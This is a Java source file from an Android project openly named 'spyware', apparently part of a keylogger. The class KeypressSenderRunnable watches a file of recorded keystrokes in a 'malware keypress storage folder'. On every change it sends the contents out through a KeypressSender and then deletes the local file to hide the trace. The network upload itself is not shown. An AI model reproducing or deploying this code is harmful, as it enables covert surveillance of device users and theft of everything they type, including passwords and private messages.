package com.example.cristianturetta.spyware;

import android.app.IntentService;
import android.app.Service;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.FileObserver;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Random;

import javax.net.ssl.HttpsURLConnection;

public class KeypressSenderRunnable implements Runnable {


    @Override
    public void run() {
        final String pathToWatch = FileUtil.getInstance().getMalwareKeypressStorageFolder()
                + File.separator + FileUtil.getInstance().getKeypressFileName();


        FileObserver observer = new FileObserver(pathToWatch) { // set up a file observer to watch this directory on sd card
            @Override
            public void onEvent(int event, String file) {
                KeypressSender keypressSender = KeypressSender.getInstance();
                FileUtil fileUtil = FileUtil.getInstance();

                try {
                    keypressSender.sendRecordedData(FileUtil.getStringFromFile(file));
                } catch (Exception e) {
                    e.printStackTrace();
                }

                fileUtil.deleteKeypressFile();
            }
        };

        observer.startWatching();
    }
}